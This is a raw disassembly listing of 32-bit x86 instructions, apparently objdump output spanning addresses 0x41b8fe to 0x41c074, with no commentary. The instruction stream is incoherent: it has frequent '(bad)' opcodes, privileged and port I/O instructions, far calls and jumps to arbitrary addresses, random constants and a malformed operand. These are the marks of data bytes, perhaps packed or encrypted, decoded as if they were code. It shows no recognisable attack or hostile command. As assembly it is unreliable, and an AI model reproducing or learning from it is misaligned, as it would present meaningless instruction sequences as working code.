  41b8fe:	scas   al,BYTE PTR es:[edi]
  41b8ff:	push   esp
  41b900:	sbb    dh,BYTE PTR [esi+0xb]
  41b903:	nop
  41b904:	jg     0x41b930
  41b906:	ror    DWORD PTR [ebx-0x1a7fc127],cl
  41b90c:	or     eax,0x79c39ef4
  41b911:	xchg   esp,eax
  41b912:	pop    edi
  41b913:	ins    DWORD PTR es:[edi],dx
  41b914:	frstor [ecx]
  41b916:	xchg   DWORD PTR [ecx-0x2e],edx
  41b919:	xchg   ebp,eax
  41b91a:	iret   
  41b91b:	cdq    
  41b91c:	out    dx,eax
  41b91d:	test   eax,0x4897218a
  41b922:	in     eax,0xc7
  41b924:	or     BYTE PTR [ebx+0xe],dh
  41b927:	mov    eax,ds:0x3251a329
  41b92c:	call   0x92c7:0xc16e7741
  41b933:	mov    esi,0xc402cc22
  41b938:	push   ds
  41b939:	push   ss
  41b93a:	jb     0x41b954
  41b93c:	inc    DWORD PTR [edi-0x603890d7]
  41b942:	jg     0x41b90c
  41b944:	call   DWORD PTR [eax-0x426952b9]
  41b94a:	(bad)  
  41b94b:	add    BYTE PTR [esi+0x7b56feb4],al
  41b951:	test   al,0x93
  41b953:	xor    eax,0xe103a674
  41b958:	mov    eax,ds:0xd44633ba
  41b95d:	ret    
  41b95e:	mov    DWORD PTR [edx+ebx*1],eax
  41b961:	shr    BYTE PTR [ecx],cl
  41b963:	adc    al,0x77
  41b965:	aad    0x5a
  41b967:	push   eax
  41b968:	push   ecx
  41b96a:	ret    
  41b96b:	icebp  
  41b96c:	adc    BYTE PTR [eax+0xf9dbd3d],bl
  41b972:	dec    edi
  41b973:	cmp    ebx,DWORD PTR [ecx]
  41b975:	jg     0x41b9b9
  41b977:	sub    ah,cl
  41b979:	push   esi
  41b97a:	stos   DWORD PTR es:[edi],eax
  41b97b:	or     eax,0xb1726391
  41b980:	xchg   esi,eax
  41b981:	jae    0x41b992
  41b983:	pop    edi
  41b984:	pop    ebx
  41b985:	jmp    0x94a4:0x392b7225
  41b98c:	rcl    DWORD PTR [eax],cl
  41b98e:	or     eax,0xa46a884b
  41b993:	xor    bl,BYTE PTR [ebx]
  41b995:	or     edi,esp
  41b997:	jne    0x41b97b
  41b999:	shl    DWORD PTR [edx-0x69],cl
  41b99c:	frndint 
  41b99e:	ja     0x41b9f4
  41b9a0:	sahf   
  41b9a1:	and    edi,DWORD PTR [ecx-0xff0eb77]
  41b9a7:	(bad)  
  41b9a8:	jbe    0x41b9eb
  41b9aa:	xchg   esi,eax
  41b9ab:	pop    es
  41b9ac:	mov    esp,0xd64be372
  41b9b1:	fisub  WORD PTR [eax+edx*8+0x39]
  41b9b5:	dec    ebp
  41b9b6:	sub    cl,0x5f
  41b9b9:	cld    
  41b9ba:	mov    esp,0xf4ee1ea5
  41b9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9c0:	out    0x5a,eax
  41b9c2:	cmp    ah,bh
  41b9c4:	adc    al,0xda
  41b9c6:	scas   eax,DWORD PTR es:[edi]
  41b9c7:	push   ds
  41b9c8:	pop    eax
  41b9c9:	inc    ebp
  41b9ca:	lea    ecx,[edi]
  41b9cc:	outs   dx,BYTE PTR ds:[esi]
  41b9cd:	and    BYTE PTR [esp+edx*2],al
  41b9d0:	jg     0x41b9f2
  41b9d2:	mov    ds:0xbf98d911,eax
  41b9d7:	sub    BYTE PTR [ebp+0x7cef111c],cl
  41b9dd:	enter  0xa285,0x58
  41b9e1:	pushf  
  41b9e2:	sub    eax,0xaac9e2b7
  41b9e7:	retf   
  41b9e8:	inc    edi
  41b9e9:	pop    ds
  41b9ea:	cmp    edi,ecx
  41b9ec:	inc    eax
  41b9ed:	aam    0x4e
  41b9ef:	jo     0x41b9b7
  41b9f1:	or     bl,bh
  41b9f3:	push   ss
  41b9f4:	cwde   
  41b9f5:	adc    ebp,DWORD PTR [esi]
  41b9f7:	jae    0x41b9bc
  41b9f9:	(bad)  [esp+eax*1-0x7f0ebd1f]
  41ba00:	js     0x41ba65
  41ba02:	pop    esi
  41ba03:	inc    edi
  41ba04:	jns    0x41ba37
  41ba06:	nop
  41ba07:	xor    DWORD PTR [ecx],ebx
  41ba09:	outs   dx,BYTE PTR ds:[esi]
  41ba0a:	imul   ecx,DWORD PTR [eax-0x66],0xffffff8c
  41ba0e:	jle    0x41b999
  41ba10:	and    esi,DWORD PTR [ebp-0x33]
  41ba13:	call   0x667a:0xa1c19f73
  41ba1a:	xor    BYTE PTR [edx+0x24471e28],0x5
  41ba21:	ins    DWORD PTR es:[edi],dx
  41ba22:	call   0xebb42929
  41ba27:	cwde   
  41ba28:	aaa    
  41ba29:	fs xchg ebp,eax
  41ba2b:	xor    al,0xc0
  41ba2d:	and    bl,BYTE PTR [ecx]
  41ba2f:	sahf   
  41ba30:	jnp    0x41ba98
  41ba32:	push   ebp
  41ba33:	loope  0x41ba7e
  41ba35:	add    dl,BYTE PTR [ecx+0x600091ba]
  41ba3b:	jl     0x41b9cc
  41ba3d:	div    eax
  41ba3f:	and    ebp,edi
  41ba41:	call   0xb6ab9429
  41ba46:	mov    bl,0x70
  41ba48:	sbb    bh,BYTE PTR [eax]
  41ba4a:	pop    esp
  41ba4b:	inc    ecx
  41ba4c:	push   ebx
  41ba4d:	jmp    0x41b9de
  41ba4f:	shl    DWORD PTR [eax-0x7e407300],1
  41ba55:	pop    ebx
  41ba56:	mov    bh,0xfe
  41ba58:	xchg   BYTE PTR [edx-0x6a66b82d],bh
  41ba5e:	cmp    ch,BYTE PTR [edi+0x5d]
  41ba61:	mov    bl,0x67
  41ba63:	mov    al,ds:0xf1362695
  41ba68:	add    eax,0x8eec80a
  41ba6d:	push   ds
  41ba6e:	jne    0x41babf
  41ba70:	mov    ebx,0xf22367a7
  41ba75:	mov    dl,0x51
  41ba77:	cmp    esp,DWORD PTR [eax+0x69]
  41ba7a:	pop    es
  41ba7b:	pushf  
  41ba7c:	pop    ecx
  41ba7d:	pop    ecx
  41ba7e:	pop    ds
  41ba7f:	test   BYTE PTR [edi+eiz*1],0xbd
  41ba83:	xchg   ebp,edx
  41ba85:	iret   
  41ba86:	les    ebx,FWORD PTR [edx-0x2f]
  41ba89:	mov    WORD PTR ss:[edx+edi*1],ss
  41ba8d:	mul    BYTE PTR [ecx+0x32]
  41ba90:	stc    
  41ba91:	push   ebx
  41ba92:	ss push ebp
  41ba94:	test   al,0x3
  41ba96:	popa   
  41ba97:	fs fwait
  41ba99:	lahf   
  41ba9a:	dec    ebx
  41ba9b:	fistp  QWORD PTR [ebx]
  41ba9d:	add    dl,0xc0
  41baa0:	xor    esp,DWORD PTR [ecx]
  41baa2:	js     0x41bb12
  41baa4:	leave  
  41baa5:	call   0xd21a9776
  41baaa:	add    BYTE PTR [edi+ecx*2],dh
  41baad:	(bad)
  41bab0:	lock push 0x13
  41bab3:	rcr    DWORD PTR [edx],0x4a
  41bab6:	popa   
  41bab7:	jl     0x41bb2a
  41bab9:	jecxz  0x41ba8e
  41babb:	sub    eax,0xe7c8b456
  41bac0:	shl    BYTE PTR [eax+ebx*8+0x3a5c0cad],0x76
  41bac8:	scas   eax,DWORD PTR es:[edi]
  41bac9:	xor    eax,0x599dcffd
  41bace:	mov    al,ds:0xccf1fb4c
  41bad3:	int    0xcd
  41bad5:	loop   0x41ba59
  41bad7:	push   eax
  41bad8:	mov    ebp,0xbe536298
  41badd:	test   BYTE PTR [esi-0x7458bb38],bh
  41bae3:	imul   esi,DWORD PTR [ebx+0x2],0x26
  41bae7:	push   0xeb7c5971
  41baec:	jmp    DWORD PTR [edi+0x2]
  41baef:	xchg   edx,eax
  41baf0:	xchg   esp,edx
  41baf2:	repz pop ebx
  41baf4:	jp     0x41bb13
  41baf6:	pop    eax
  41baf7:	xor    esp,DWORD PTR [ebx+ebp*4]
  41bafa:	icebp  
  41bafb:	push   es
  41bafc:	clc    
  41bafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bafe:	xor    DWORD PTR [ecx],0x74
  41bb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb02:	pop    esi
  41bb03:	jecxz  0x41bb32
  41bb05:	cs push ss
  41bb07:	frstor ds:0xd31ac9eb
  41bb0d:	rol    edi,0xbc
  41bb10:	sub    al,0x19
  41bb12:	jne    0x41baf1
  41bb14:	call   0x2aa47f9f
  41bb19:	sub    eax,0x5934dff2
  41bb1e:	retf   0x17f7
  41bb21:	jb     0x41baf0
  41bb23:	xchg   ebp,eax
  41bb24:	ins    DWORD PTR es:[edi],dx
  41bb25:	sahf   
  41bb26:	sbb    eax,0x24d32bea
  41bb2b:	xchg   ebp,eax
  41bb2c:	mov    edx,0xd17e29db
  41bb31:	test   DWORD PTR [ebp+0x71],esp
  41bb34:	lods   eax,DWORD PTR ds:[esi]
  41bb35:	sti    
  41bb36:	lahf   
  41bb37:	dec    ebp
  41bb38:	adc    DWORD PTR [edi-0x11],esi
  41bb3b:	mov    al,0xac
  41bb3d:	cmp    DWORD PTR fs:[eax+0x645e1d64],edi
  41bb44:	sahf   
  41bb45:	pushf  
  41bb46:	out    0xad,eax
  41bb48:	mov    ds:0x5b995064,al
  41bb4d:	repnz ins DWORD PTR es:[edi],dx
  41bb4f:	inc    ecx
  41bb50:	das    
  41bb51:	jg     0x41baf6
  41bb53:	jno    0x41baf9
  41bb55:	and    dh,bh
  41bb57:	and    eax,0x6b89b2c0
  41bb5c:	add    DWORD PTR [edx],eax
  41bb5e:	or     DWORD PTR [eax+0x22],esp
  41bb61:	int    0x6c
  41bb63:	mov    BYTE PTR [edx-0x55],dh
  41bb66:	or     BYTE PTR [edi+0x3b338289],ch
  41bb6c:	enter  0xc114,0x0
  41bb70:	into   
  41bb71:	pop    ebp
  41bb72:	inc    ecx
  41bb73:	pop    DWORD PTR [edx+edi*8+0x2a25ed5e]
  41bb7a:	jns    0x41bba1
  41bb7c:	aaa    
  41bb7d:	(bad)  
  41bb7e:	iret   
  41bb7f:	cmp    DWORD PTR [esi+eax*8+0x23],esi
  41bb83:	stos   DWORD PTR es:[edi],eax
  41bb84:	add    ebp,edx
  41bb86:	mov    ebp,0x51a7ef07
  41bb8b:	xchg   ebx,eax
  41bb8c:	(bad)  
  41bb8d:	arpl   WORD PTR [ebx-0x44],si
  41bb90:	imul   edi,DWORD PTR [eax-0x43f5fd78],0x43
  41bb97:	pop    edi
  41bb98:	or     edi,esi
  41bb9a:	mov    edx,0x813eff1f
  41bb9f:	add    DWORD PTR ds:0xb6216a87,ebx
  41bba5:	sub    DWORD PTR [ebp-0x3caef8a1],eax
  41bbab:	and    DWORD PTR [ebp-0x1d],0x85ab85e
  41bbb2:	pop    ds
  41bbb3:	adc    BYTE PTR [ebx+eax*1+0x4a],ch
  41bbb7:	pop    esp
  41bbb8:	adc    al,0x84
  41bbbb:	idiv   DWORD PTR [edi+0x59]
  41bbbe:	mov    cl,BYTE PTR [edx-0x3a]
  41bbc1:	ins    DWORD PTR es:[edi],dx
  41bbc2:	xor    dl,BYTE PTR [ecx+0x55]
  41bbc5:	push   esi
  41bbc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc7:	mov    al,ds:0x604d19b4
  41bbcc:	ins    DWORD PTR es:[edi],dx
  41bbcd:	mov    edi,edx
  41bbcf:	lds    edi,FWORD PTR [esi]
  41bbd1:	xchg   edx,eax
  41bbd2:	dec    edi
  41bbd3:	out    dx,eax
  41bbd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd5:	scas   al,BYTE PTR es:[edi]
  41bbd6:	out    0x89,al
  41bbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd9:	jns    0x41bbd0
  41bbdb:	sbb    edi,edx
  41bbdd:	sub    esp,DWORD PTR [ebx]
  41bbdf:	or     edi,esp
  41bbe1:	loopne 0x41bc50
  41bbe3:	jo     0x41bc25
  41bbe5:	sti    
  41bbe6:	imul   edx,DWORD PTR [edx+0x26],0xffffff91
  41bbea:	(bad)  
  41bbeb:	out    dx,eax
  41bbec:	or     DWORD PTR [edi-0x47],esi
  41bbef:	cdq    
  41bbf0:	push   ds
  41bbf1:	xor    ecx,DWORD PTR [esi-0x75a672fc]
  41bbf7:	mov    ecx,DWORD PTR [edi+0x4a18de99]
  41bbfd:	dec    ebx
  41bbfe:	push   ds
  41bbff:	xlat   BYTE PTR ds:[ebx]
  41bc00:	adc    BYTE PTR [esi+0x23],bh
  41bc03:	or     ecx,ebp
  41bc05:	or     al,0xa3
  41bc07:	fidivr WORD PTR [esi-0x7994663]
  41bc0d:	mov    ebx,0x29bb2927
  41bc12:	sbb    cl,al
  41bc14:	jmp    0xd7ef:0x4f31fd67
  41bc1b:	mul    DWORD PTR [esi-0x4f]
  41bc1e:	mov    edx,0x47eb4ba5
  41bc23:	jl     0x41bc99
  41bc25:	hlt    
  41bc26:	loop   0x41bc20
  41bc28:	fild   WORD PTR [ebx]
  41bc2a:	femms  
  41bc2c:	or     esp,DWORD PTR [esi]
  41bc2e:	dec    edx
  41bc2f:	push   0xfbeb6f2b
  41bc34:	jno    0x41bc91
  41bc36:	xchg   esi,eax
  41bc37:	rcr    DWORD PTR [edi-0x4a1e5260],0x4a
  41bc3e:	sub    DWORD PTR [edi],ebp
  41bc40:	mov    dh,0x8e
  41bc42:	and    dh,dh
  41bc44:	mov    dl,0xf2
  41bc46:	jmp    0x366326d9
  41bc4b:	add    DWORD PTR [esi],edi
  41bc4d:	xchg   ecx,eax
  41bc4e:	aad    0x6b
  41bc50:	call   0x64f612e1
  41bc55:	jb     0x41bbd8
  41bc57:	ret    
  41bc58:	arpl   bx,di
  41bc5a:	xchg   esi,eax
  41bc5b:	dec    edx
  41bc5c:	les    esi,FWORD PTR [eax+edi*1-0x1e7ccfaf]
  41bc63:	mov    edx,0x95f0a4f6
  41bc68:	dec    ecx
  41bc69:	jmp    0xba23ed8f
  41bc6e:	out    0x93,al
  41bc70:	je     0x41bc00
  41bc72:	sbb    eax,0xc1a65439
  41bc77:	jo     0x41bc53
  41bc79:	int3   
  41bc7a:	or     bh,dl
  41bc7c:	push   esi
  41bc7d:	mov    ah,0x18
  41bc7f:	dec    esi
  41bc80:	mov    al,ds:0x8d3e51a9
  41bc85:	aaa    
  41bc86:	mov    ebp,0x810fc31f
  41bc8b:	pop    ebx
  41bc8c:	xor    al,0x35
  41bc8e:	adc    DWORD PTR [ebx+eax*2+0x50],edx
  41bc92:	sahf   
  41bc93:	arpl   WORD PTR [edi+0x0],ax
  41bc96:	icebp  
  41bc97:	jmp    0x41bca5
  41bc99:	mov    ebp,0xbc936227
  41bc9e:	push   eax
  41bc9f:	sub    ecx,DWORD PTR [edi]
  41bca1:	mov    ah,0x6f
  41bca3:	ret    0x88f3
  41bca6:	rcl    edx,1
  41bca8:	pusha  
  41bca9:	pop    ds
  41bcaa:	adc    dl,BYTE PTR [ebp+0x6e]
  41bcad:	adc    edi,esi
  41bcaf:	int    0x78
  41bcb1:	ins    DWORD PTR es:[edi],dx
  41bcb2:	les    ebx,FWORD PTR [eax]
  41bcb4:	lods   eax,DWORD PTR ds:[esi]
  41bcb5:	repz sbb dh,BYTE PTR [ebp-0x162831d2]
  41bcbc:	cmc    
  41bcbd:	imul   ebp,DWORD PTR [edi],0x16
  41bcc0:	add    ah,BYTE PTR ds:0x7f64ee6f
  41bcc6:	dec    edx
  41bcc7:	out    dx,al
  41bcc8:	and    eax,0x9d003c6c
  41bccd:	mov    esp,0xf81eabfa
  41bcd2:	dec    ecx
  41bcd3:	mov    ds:0xf89cfd3f,al
  41bcd8:	cmp    BYTE PTR [ebx+edx*1+0x3635841a],dl
  41bcdf:	test   ch,al
  41bce1:	xchg   edx,eax
  41bce2:	pop    esp
  41bce3:	iret   
  41bce4:	pushf  
  41bce5:	ret    
  41bce6:	xor    eax,0xb4349129
  41bceb:	stc    
  41bcec:	sbb    ch,BYTE PTR [edx-0x70]
  41bcef:	push   eax
  41bcf0:	dec    esi
  41bcf1:	jnp    0x41bcd8
  41bcf3:	sbb    esi,DWORD PTR ds:0xf8a551c1
  41bcf9:	pop    ebx
  41bcfa:	aas    
  41bcfb:	xor    al,0xad
  41bcfd:	mov    eax,ds:0xa81bd7ea
  41bd02:	aam    0x66
  41bd04:	mov    ebp,0xf549bdd2
  41bd09:	(bad)  
  41bd0a:	(bad)  
  41bd0b:	lea    esi,[esi+0xe6971e3]
  41bd11:	jecxz  0x41bd0c
  41bd13:	pop    ss
  41bd14:	xor    BYTE PTR es:[ebp-0x7e],dh
  41bd18:	ss jbe 0x41bceb
  41bd1b:	jp     0x41bd4a
  41bd1d:	(bad)  
  41bd1e:	(bad)  
  41bd20:	dec    DWORD PTR [eax+0x4e]
  41bd23:	sbb    al,0xa2
  41bd25:	xchg   esp,eax
  41bd26:	sbb    BYTE PTR [eax+0x6b],al
  41bd29:	sar    BYTE PTR [eax+0x7bc99e4b],0x0
  41bd30:	aam    0x24
  41bd32:	pusha  
  41bd33:	into   
  41bd34:	sub    al,0xb6
  41bd36:	xor    ebx,DWORD PTR [edx]
  41bd38:	retf   
  41bd39:	out    dx,al
  41bd3a:	cld    
  41bd3b:	jno    0x41bd3f
  41bd3d:	sbb    BYTE PTR [edi],0x93
  41bd40:	or     esp,ebp
  41bd42:	call   0x2fdb:0x5551c15a
  41bd49:	fwait
  41bd4a:	xchg   esp,eax
  41bd4b:	xchg   esp,eax
  41bd4c:	(bad)
  41bd4f:	xchg   ebx,eax
  41bd50:	test   BYTE PTR [ecx-0x1b],0x89
  41bd54:	cmp    al,0x28
  41bd56:	gs adc eax,ebp
  41bd59:	and    DWORD PTR [ebx-0x76],eax
  41bd5c:	into   
  41bd5d:	pop    edi
  41bd5e:	xchg   edx,edi
  41bd60:	cwde   
  41bd61:	cmp    cl,cl
  41bd63:	lds    esi,FWORD PTR [eax-0x5cea940a]
  41bd69:	rcr    BYTE PTR [ecx-0x71],1
  41bd6c:	push   edi
  41bd6d:	outs   dx,DWORD PTR ds:[esi]
  41bd6e:	cmp    al,0xbb
  41bd70:	adc    edx,DWORD PTR ds:0xf548b565
  41bd76:	dec    ecx
  41bd77:	popa   
  41bd78:	mov    esi,0xad2ea06c
  41bd7d:	mov    ebp,0x9ea66c7a
  41bd82:	addr16 test al,0x5
  41bd85:	aam    0x98
  41bd87:	fst    QWORD PTR [edi+0x87082f]
  41bd8d:	mov    ebx,0xad069f11
  41bd92:	jb     0x41bdda
  41bd94:	inc    ecx
  41bd95:	pushf  
  41bd96:	mov    eax,ds:0x7d3582b6
  41bd9b:	test   al,0x97
  41bd9d:	inc    ebp
  41bd9e:	dec    ecx
  41bd9f:	cli    
  41bda0:	cmp    DWORD PTR [ecx],ecx
  41bda2:	mov    ds:0x65500459,eax
  41bda7:	aad    0x34
  41bda9:	imul   ecx,DWORD PTR [ecx+0x28a8c444],0x5827fa40
  41bdb3:	xor    eax,0xae200881
  41bdb8:	add    al,BYTE PTR ds:0x77c9a88
  41bdbe:	cmp    ah,0xb8
  41bdc1:	stos   BYTE PTR es:[edi],al
  41bdc2:	aam    0xc1
  41bdc4:	fwait
  41bdc5:	jp     0x41bd7a
  41bdc7:	sub    DWORD PTR [ebx-0xbb6fb46],ebp
  41bdcd:	mov    ?,WORD PTR [ecx+0x2c0aacfc]
  41bdd3:	xor    al,0xcf
  41bdd5:	lds    esi,FWORD PTR [ecx+0x47ed8c46]
  41bddb:	add    eax,0xd520267e
  41bde0:	jns    0x41bde8
  41bde2:	jo     0x41bd85
  41bde4:	sti    
  41bde5:	mov    DWORD PTR [eax+0x16],eax
  41bde8:	jb     0x41bdbb
  41bdea:	xor    al,0x6d
  41bdec:	mov    BYTE PTR [esi-0x59],bl
  41bdef:	mov    dh,0x87
  41bdf1:	ror    edi,0xe9
  41bdf4:	jg     0x41bd80
  41bdf6:	pushf  
  41bdf7:	aaa    
  41bdf8:	std    
  41bdf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdfa:	cmp    al,0xe2
  41bdfc:	pop    edi
  41bdfd:	dec    esi
  41bdfe:	out    0xe7,eax
  41be00:	loop   0x41be55
  41be02:	fidivr WORD PTR [edi-0x59f375b2]
  41be08:	int    0x2e
  41be0a:	xchg   ebp,ebp
  41be0c:	xchg   DWORD PTR [edx],edx
  41be0e:	outs   dx,BYTE PTR ds:[esi]
  41be0f:	inc    esp
  41be10:	inc    edx
  41be11:	push   0xffffffba
  41be13:	mov    bh,0x57
  41be15:	adc    DWORD PTR [eax],ecx
  41be17:	pop    esp
  41be18:	test   eax,0xc6fe6a9f
  41be1d:	ss jo  0x41bdfa
  41be20:	aas    
  41be21:	sub    DWORD PTR [esi],eax
  41be23:	add    DWORD PTR [ebp-0x4],esp
  41be26:	jns    0x41be9e
  41be28:	stos   BYTE PTR es:[edi],al
  41be29:	dec    esp
  41be2a:	and    DWORD PTR [eax+0x1c40e31c],edx
  41be30:	inc    edi
  41be31:	xchg   ecx,eax
  41be32:	sahf   
  41be33:	dec    ebx
  41be34:	fbld   TBYTE PTR [ebx-0x33]
  41be37:	ja     0x41beb2
  41be39:	jl     0x1257f2cf
  41be3f:	add    DWORD PTR [edx],ecx
  41be41:	out    dx,eax
  41be42:	sbb    eax,0x1b966def
  41be47:	(bad)  
  41be48:	paddw  mm6,QWORD PTR [ebp+0x3b]
  41be4c:	clc    
  41be4d:	mov    BYTE PTR [esi+0x458f740d],bl
  41be53:	adc    al,0x9e
  41be55:	push   cs
  41be56:	add    DWORD PTR [edx-0x39],esi
  41be59:	sbb    ecx,esi
  41be5b:	es jg  0x41beb7
  41be5e:	mov    eax,ds:0xb23fc123
  41be63:	fimul  WORD PTR [ecx-0x46]
  41be66:	jp     0x41be38
  41be68:	jae    0x41bea1
  41be6a:	cmp    DWORD PTR [ebx+0x8a4c579],ebp
  41be70:	or     BYTE PTR [ebx+0x2b0a83bd],bh
  41be76:	aas    
  41be77:	mov    eax,0xe40277a2
  41be7c:	ins    BYTE PTR es:[edi],dx
  41be7d:	rcr    BYTE PTR [esi-0x43614195],0xd0
  41be84:	inc    ebx
  41be85:	mov    DWORD PTR [eax+eax*2+0x22362277],esp
  41be8c:	jmp    0x41beab
  41be8e:	mov    BYTE PTR [esi],ch
  41be90:	inc    edx
  41be91:	lods   al,BYTE PTR ds:[esi]
  41be92:	mov    WORD PTR [ebx],ds
  41be94:	adc    al,0xf0
  41be96:	(bad)  
  41be97:	and    ch,BYTE PTR [ecx+0x7fff408d]
  41be9d:	mov    ebx,0x470d3e9a
  41bea2:	mov    esi,0xac9dfae6
  41bea7:	test   al,0x24
  41bea9:	xchg   esi,eax
  41beaa:	xchg   BYTE PTR [edx-0x1a],cl
  41bead:	test   DWORD PTR [ebx],0x6bf3f707
  41beb3:	and    al,0xbc
  41beb5:	test   eax,0xeaf7dcab
  41beba:	push   eax
  41bebb:	mov    al,ds:0x4c23d03f
  41bec0:	inc    edi
  41bec1:	dec    ebp
  41bec2:	dec    ecx
  41bec3:	ficom  DWORD PTR [edi]
  41bec5:	aam    0x42
  41bec7:	jae    0x41bee3
  41bec9:	imul   ecx,ebp,0x92c17a39
  41becf:	cmp    edx,DWORD PTR [edx+0x52941637]
  41bed5:	in     al,dx
  41bed6:	pop    ds
  41bed7:	stos   DWORD PTR es:[edi],eax
  41bed8:	jns    0x41beb1
  41beda:	(bad)  
  41bedc:	outs   dx,BYTE PTR ds:[esi]
  41bedd:	imul   DWORD PTR [edi+0x38]
  41bee0:	add    DWORD PTR [esi+edx*8+0x72b20f67],ebx
  41bee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee8:	push   edi
  41bee9:	call   0x83af7f37
  41beee:	mov    dl,0x71
  41bef0:	push   ebp
  41bef1:	ror    BYTE PTR [edi-0x7c],0xae
  41bef5:	push   esp
  41bef6:	xor    eax,DWORD PTR [esi+0x7e]
  41bef9:	inc    ecx
  41befa:	mov    ecx,ss
  41befc:	or     ch,BYTE PTR [eax+0x11]
  41beff:	stc    
  41bf00:	test   al,0xdc
  41bf02:	cwde   
  41bf03:	int3   
  41bf04:	std    
  41bf05:	and    BYTE PTR [edi+0x77681b15],ah
  41bf0b:	add    dh,al
  41bf0d:	lock mov esi,0x881162ef
  41bf13:	addr16 dec ecx
  41bf15:	call   0x80afc844
  41bf1a:	sbb    bl,BYTE PTR [eax+0x6a919c40]
  41bf20:	aaa    
  41bf21:	je     0x41bf85
  41bf23:	or     esi,DWORD PTR [edi+0x30]
  41bf26:	inc    esp
  41bf27:	and    eax,0xb611c495
  41bf2c:	xor    al,0xd
  41bf2e:	sub    BYTE PTR [ebp+0x53bce2ad],bl
  41bf34:	popf   
  41bf35:	mov    al,0x61
  41bf37:	scas   al,BYTE PTR es:[edi]
  41bf38:	enter  0xe923,0xee
  41bf3c:	pop    ss
  41bf3d:	aaa    
  41bf3e:	fistp  WORD PTR [eax+ecx*1+0x4a]
  41bf42:	outs   dx,DWORD PTR ds:[esi]
  41bf43:	cmp    dl,BYTE PTR [eax+0x444693e6]
  41bf49:	faddp  st(7),st
  41bf4b:	mov    al,ds:0xc5fca685
  41bf50:	jmp    0xf3a1:0x398c7ed3
  41bf57:	pop    ebp
  41bf58:	icebp  
  41bf59:	loop   0x41bf1b
  41bf5b:	adc    dl,BYTE PTR [esi-0x29e19b19]
  41bf61:	mov    ds:0x5c7bdca0,al
  41bf66:	mov    esp,0xa0bf582b
  41bf6b:	cli    
  41bf6c:	mov    dh,dh
  41bf6e:	daa    
  41bf6f:	push   edi
  41bf70:	sbb    ecx,DWORD PTR [esi+0x59]
  41bf73:	gs dec ebx
  41bf75:	mov    esi,0xdbb6384
  41bf7a:	fs (bad) 
  41bf7d:	fiadd  WORD PTR [eax+0x6590ba7e]
  41bf83:	jbe    0x41bfd7
  41bf85:	cli    
  41bf86:	push   DWORD PTR [ecx-0x40]
  41bf89:	mov    ch,BYTE PTR [edx-0x2a981751]
  41bf8f:	sbb    al,dh
  41bf91:	dec    eax
  41bf92:	in     al,0x2f
  41bf94:	stos   DWORD PTR es:[edi],eax
  41bf95:	aad    0xae
  41bf97:	cmp    DWORD PTR [ebx],edi
  41bf99:	es cli 
  41bf9b:	out    0xe2,eax
  41bf9d:	int    0x12
  41bf9f:	hlt    
  41bfa0:	xor    edx,DWORD PTR [esi]
  41bfa2:	add    al,0xf
  41bfa4:	(bad)  
  41bfa5:	out    0xd2,eax
  41bfa7:	gs xchg ecx,eax
  41bfa9:	pop    esp
  41bfaa:	mov    esp,0x2fc2a7a4
  41bfaf:	adc    DWORD PTR [ecx+0x122daa29],esi
  41bfb5:	pop    ebp
  41bfb6:	cli    
  41bfb7:	adc    bh,BYTE PTR [ecx]
  41bfb9:	jo     0x41bff0
  41bfbb:	add    DWORD PTR [edx],eax
  41bfbd:	sub    eax,0x999258a3
  41bfc2:	xor    DWORD PTR [edx],esp
  41bfc4:	xchg   ecx,eax
  41bfc5:	push   0xee3c6916
  41bfca:	aas    
  41bfcb:	mov    ch,0xc5
  41bfcd:	sahf   
  41bfce:	cld    
  41bfcf:	mov    ebp,0x9705d68a
  41bfd4:	cs (bad) 
  41bfd6:	enter  0xa1d9,0x95
  41bfda:	sub    eax,0xdfdb85e2
  41bfdf:	inc    edi
  41bfe0:	or     dh,BYTE PTR [ebp+eiz*8+0xcd3bc2f]
  41bfe7:	nop
  41bfe8:	ins    DWORD PTR es:[edi],dx
  41bfe9:	mov    edx,DWORD PTR [esi-0x2f]
  41bfec:	aam    0x0
  41bfee:	outs   dx,DWORD PTR ds:[esi]
  41bfef:	add    BYTE PTR [ebx+0x115b204b],ah
  41bff5:	xchg   ah,cl
  41bff7:	xchg   BYTE PTR [edx+0x53],dl
  41bffa:	jae    0x41bfcf
  41bffc:	mov    ebx,0xd21bbdb4
  41c001:	push   ebp
  41c002:	arpl   WORD PTR [ebx],sp
  41c004:	iret   
  41c005:	(bad)  
  41c007:	inc    eax
  41c008:	pop    eax
  41c009:	and    al,0x77
  41c00b:	mov    ch,0x1e
  41c00d:	xor    BYTE PTR [esi],al
  41c00f:	pop    es
  41c010:	cmp    dl,BYTE PTR [ecx+0x3e]
  41c013:	ja     0x41c010
  41c015:	es int3 
  41c017:	cs mov dl,0xa8
  41c01a:	test   DWORD PTR [ecx],0xaac3c647
  41c020:	fst    DWORD PTR [edi+0x14958bf7]
  41c026:	bound  ecx,QWORD PTR [esi]
  41c028:	fmul   QWORD PTR [edx]
  41c02a:	popf   
  41c02b:	adc    eax,0x7609a504
  41c030:	or     BYTE PTR [edx+esi*4],0x19
  41c034:	pop    ds
  41c035:	sbb    al,0x38
  41c037:	dec    ecx
  41c038:	cmc    
  41c039:	or     al,0x87
  41c03b:	fcom   QWORD PTR [ebx]
  41c03d:	add    BYTE PTR [edi],0x7
  41c040:	pop    ebx
  41c041:	mov    BYTE PTR [esi],dl
  41c043:	aad    0x32
  41c045:	ja     0x41c031
  41c047:	aad    0x4
  41c049:	loopne 0x41c020
  41c04b:	into   
  41c04c:	nop
  41c04d:	ror    DWORD PTR [edi+0x28],0x41
  41c051:	out    0x4,al
  41c053:	add    dl,BYTE PTR [esi-0x6a928fa5]
  41c059:	mov    BYTE PTR [eax+0x13],bh
  41c05c:	adc    eax,ecx
  41c05e:	aad    0x23
  41c060:	mov    cl,0x69
  41c062:	push   esp
  41c063:	movsx  esp,WORD PTR [edx]
  41c066:	mov    al,0x90
  41c068:	cdq    
  41c069:	add    ebx,edx
  41c06b:	(bad)  
  41c06c:	stos   BYTE PTR es:[edi],al
  41c06d:	inc    edx
  41c06e:	ds ja  0x41c03e
  41c071:	in     eax,dx
  41c072:	(bad)  
  41c073:	sti    
  41c074:	fadd   st,st(7)
